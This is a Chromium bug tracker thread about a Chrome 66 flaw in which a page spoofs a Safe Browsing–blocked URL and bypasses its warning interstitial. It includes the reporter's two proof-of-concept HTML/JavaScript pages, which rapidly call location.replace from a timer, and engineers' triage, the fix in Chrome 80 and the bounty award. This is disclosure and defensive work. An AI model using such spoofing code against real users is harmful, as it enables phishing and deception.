# Chrome Url Spoofing via Interstitial content overwrite

| Field | Value |
|-------|-------|
| **Issue ID** | [40091380](https://issues.chromium.org/issues/40091380) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | UI>Browser>Interstitials |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ev...@gmail.com |
| **Assignee** | ca...@chromium.org |
| **Created** | 2018-05-15 |
| **Bounty** | $2,000.00 |

## Description

UserAgent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36

Steps to reproduce the problem:
1. Open url: https://server.n0tr00t.com/chrome/url_spoof_bypass_dangerous.html
2. Click test <a> tag
3. We'll see the effect of a successful bypass dangerous page and url spoof

What is the expected behavior?
N/A

What went wrong?
<html>
<head>
    <title>Chrome Url Spoofing (bypass dangerous website) vulnerability</title>
    <!--
        author: evi1m0.bat[at]gmail.com
        test version: 66.0.3359.170
    -->
</head>
<script>
function pwn() {
    w = window.open(
            "javascript:document.write('<h1>Url Spoofing!!!</h1>');",
            "new",
            "width=500 height=500"
        );
    setInterval("w.location.replace('http://testsafebrowsing.appspot.com/apiv4/ANY_PLATFORM/MALWARE/URL/');",5);
}
</script>
<h1><a href="#" onclick="pwn()">CLICK ME</a></h1>
</html>

Did this work before? N/A 

Chrome version: 66.0.3359.170  Channel: stable
OS Version: 10.0
Flash Version: Shockwave Flash 29.0 r0

The problem maybe due to the high priority of the browser layer for check malicious URLs in advance. For example: http://ff0000.cc can display dangerous page hints even though DNS is not parsed. After repeated ```setInterval```, pages retain the contents behind them.

## Attachments

- [15263854274978.png](attachments/15263854274978.png) (image/png, 36.1 KB)
- [15263854103093.png](attachments/15263854103093.png) (image/png, 31.1 KB)
- [aboutblank.png](attachments/aboutblank.png) (image/png, 55.8 KB)
- [Successful.png](attachments/Successful.png) (image/png, 68.3 KB)
- [c3511b9-7173-49e2-8562-efd3a842c05b.png](attachments/c3511b9-7173-49e2-8562-efd3a842c05b.png) (image/png, 34.1 KB)

## Timeline

### el...@chromium.org (2018-05-15)

Interesting find!

I get three different results with this repro: 1. An about:blank URL, 2. A proper spoof, 3. A URL spoof with the "Dangerous" badge remaining. 

Of these, #2, is obviously the most severe, and #1 is probably Working as Intended.

As an attack, it's of limited scope insofar as it requires that the victim site be blocked by Safe Browsing. But I wonder if the same attack would work against a victim HTTPS page with a certificate mismatch (e.g. https://wrong.host.badssl.com/) in which case the scope would be much broader.


### ev...@gmail.com (2018-05-15)

Hi, The issue maybe due to the high priority of the browser layer for check malicious URLs in advance. For example: http://ff0000.cc can display dangerous page hints even though DNS is not parsed. After repeated ```setInterval```, pages retain the contents behind them. Nevertheless, I think the problem should be in the medium risk because he bypassed the dangerous warning and completed the hijacking of the page. xD

### ca...@chromium.org (2018-05-15)

Tried with https://wrong.host.badssl.com/ as elawrence suggested, and that works properly (i.e. ends with an about:blank URL), so this does seem to be specific to the Safe Browsing check. Since this works intermittently, I imagine this exploits some race conditions happening during the check, I'll take a deeper look into this (and add the SafeBrowsing component so SafeBrowsing folks can chime in about this).

[Monorail components: UI>Browser>SafeBrowsing]

### ca...@chromium.org (2018-05-15)

[Empty comment from Monorail migration]

### me...@chromium.org (2018-05-15)

Thanks for the report!

Given the limited scope (sites considered unsafe by SafeBrowsing) and the flakiness where sometimes about:blank is shown, I'm marking this as low-severity.

### el...@chromium.org (2018-05-15)

I think the intent in #5 was to assign to Carlos.

### es...@chromium.org (2018-05-16)

I can sort of repro with an SSL interstitial. I get a flickering back and forth between "Url Spoofing!!!" and the interstitial, with expired.badssl.com and a Not Secure chip in the omnibox the whole time.

I suspect this is another interstitials-are-weird bug that'll be fixed by committed interstitials, and not truly specific to Safe Browsing, except for perhaps some timing that happens to work out correctly with Safe Browsing checks. We go into an endless loop of creating a new interstitial, which hides the old one, except for with Safe Browsing it seems to somehow create the new one (hiding the old one) before the old one has actually been drawn.

OP, if you can find a way to repro with SSL errors without the flickering, that would upgrade this bug from Low severity to High (or at least Medium if the repro isn't fully reliable).

[Monorail components: UI>Browser>Interstitials]

### ca...@chromium.org (2018-05-16)

Interesting, just checked with expired.badssl and I can also reproduce it (albeit in that flashing way mentioned in #7), but I can't with wrong.host.badssl, I wonder if this is also some timing issue (maybe the clock check to decide if we should show a bad clock interstitial?) with expired cert interstitials that doesn't happen for wrong hosts. 

It looks like the flakiness is a matter of whether the next call to location.replace happens before the next interstitial is created (hence interstitials that are slower to create, like SafeBrowsing ones, are more vulnerable). I tried setting the interval to 0, so it repeats as fast as Chrome allows and the wrong.host one flickering gets slightly less noticeable. I'd imagine if we were able to set the interval to something smaller without Chrome throttling it, we'd be able to repro this on any type of interstitial (and reliably). 

Committed interstitials does fix this, since interstitials are no longer hidden before showing the new one. However if this can be reproduced without the flickering for SSL errors, we'd need to do another fix while committed interstitials launch.

### ev...@gmail.com (2018-05-17)

#8 @carlosil Your idea is the same as mine! With regard to the `expired.badssl` error page, I am also thinking about a faster refresh than 0, So that users can not feel the frequent refresh of the page, can make the hijacking effect better and perfect.Unfortunately, I have done a small part of the work, the perfect effect has not been achieved for the time being, I hope you can help think together, I think the problem exists, It's just that there's no better idea now. So, I think `Security_Severity` should be medium, thanks again for evaluation. 

:)

e.g: https://server.n0tr00t.com/chrome/url_spoof_bypass_dangerous2.html

```
<script>
function pwn() {
    w = window.open(
            "javascript:document.write('<h1>Url Spoofing!!!</h1>');",
            "new",
            "width=500 height=500"
        );
}
setInterval(`
    try{
        w.location.replace('https://expired.badssl.com/');
    }catch(e){
        console.log();
    }`)
</script>
<h1><a href="#" onclick="pwn()">CLICK ME</a></h1>
```



### ev...@gmail.com (2018-05-17)

However, `bypass dangerous website prompt` and `bypass expire.badssl prompt - > URL spoof` are two things, though the underlying causes may be similar. :D

### np...@chromium.org (2018-05-25)

[Empty comment from Monorail migration]

### ev...@gmail.com (2018-07-17)

Hi, hijacking/bypass SafeBrowsingMode it's SecSeverity-Low? In addition, there seems to be little progress. 

### ca...@chromium.org (2018-07-17)

Sorry about the delay, I have been focusing on getting committed interstitials to launch instead of working on the bugs one by one, since CI will fix a bunch of bugs related to interstitials not being normal navigations (including this one). 

We determined this to be low severity since it only lets you spoof the URL to the URL of a site that was already blocked by safe browsing, so the scope is very limited. As mentioned in #7 if you do have a PoC for doing this reliably and without flickering with any site that has HTTPS errors, then this would be a high or medium severity bug.

As for bypassing SafeBrowsing, it doesn't seem the blocked site itself can trigger this to bypass the interstitial, this is a third site spoofing the url of a blocked site (i.e. https://testsafebrowsing.appspot.com/s/phishing.html can't trigger this itself to go past the interstitial, it has to be a different site that wants to spoof its URL to https://testsafebrowsing.appspot.com/s/phishing.html, and then the original content from https://testsafebrowsing.appspot.com/s/phishing.html is not shown). 
If you do have a PoC where a site blocked by SB or a site with SSL errors can bypass the interstitial, that would be a higher severity bug (and potentially a separate bug).

### ev...@gmail.com (2018-07-19)

OK, I know. This attack is a way to bypass the normal web site, and the web site that is intercepted by SB is not possible, because the page will not be loaded to the HTML of the intercepted site, and how to bypass it.

PoC: https://server.n0tr00t.com/chrome/url_spoof_bypass_dangerous.html

What I mean is that the website that was originally intercepted by SB should not be accessed in any way. PoC did it. As to whether he is low or medium, I think it is not particularly important. Thank you for your reply. :)

### mm...@chromium.org (2019-07-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-12-11)

[Empty comment from Monorail migration]

### es...@chromium.org (2019-12-20)

I'm going to upgrade this to Medium severity. I think this was triaged as Low because it allows attacker.com to spoof victim.com, with the heavily mitigating factor that victim.com must be blocked by Safe Browsing. However, it can also be seen as a Safe Browsing bypass (cc vakh as FYI). Suppose an attacker owns a valuable domain like go0gle.com that has been blocked by Safe Browsing. This bug allows the attacker to show content on go0gle.com without an interstitial even though it's been blocked.

With SB committed interstitials enabled on stable (--enable-features=SafeBrowsingCommittedInterstitials), I see the interstitial flickering on testsafebrowsing.appspot.com, which seems weird but fine. So it looks like committed interstitials fixes the spoof/SB bypass.

Safe Browsing committed interstitials are targeted to launch in Chrome 80, so I think we can mark this Fixed once that happens.

### sh...@chromium.org (2019-12-21)

carlosil: Uh oh! This issue still open and hasn't been updated in the last 521 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-12-21)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2020-01-05)

carlosil: Uh oh! This issue still open and hasn't been updated in the last 536 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ca...@chromium.org (2020-01-06)

SB committed interstitials are still on track for 80, so this bug will be resolved with that launch. 

### sh...@chromium.org (2020-02-05)

[Empty comment from Monorail migration]

### [Deleted User] (2020-04-09)

[Empty comment from Monorail migration]

### ca...@chromium.org (2020-04-24)

SB committed interstitials have now launched (in 80), marking this as fixed.

### ca...@chromium.org (2020-04-24)

[Empty comment from Monorail migration]

### [Deleted User] (2020-04-25)

[Empty comment from Monorail migration]

### na...@google.com (2020-04-30)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-04-30)

Congrats! The Panel decided to award $2,000 for this report!

### na...@google.com (2020-05-01)

[Empty comment from Monorail migration]

### ad...@google.com (2020-05-13)

I'll retrospectively add this to the M80 release notes in due course.

### ad...@google.com (2020-06-01)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-06-03)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-06-03)

[Empty comment from Monorail migration]

### [Deleted User] (2020-08-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@google.com (2021-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/843095?no_tracker_redirect=1

[Multiple monorail components: UI>Browser>Interstitials, UI>Browser>SafeBrowsing]
[Monorail blocking: crbug.com/chromium/392354]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091380)*
